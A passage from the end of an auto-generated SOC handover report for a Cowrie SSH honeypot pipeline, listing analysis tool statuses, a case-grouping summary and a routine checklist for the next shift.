| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 10 recon entry/entries in table (5 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T17:47:40Z_
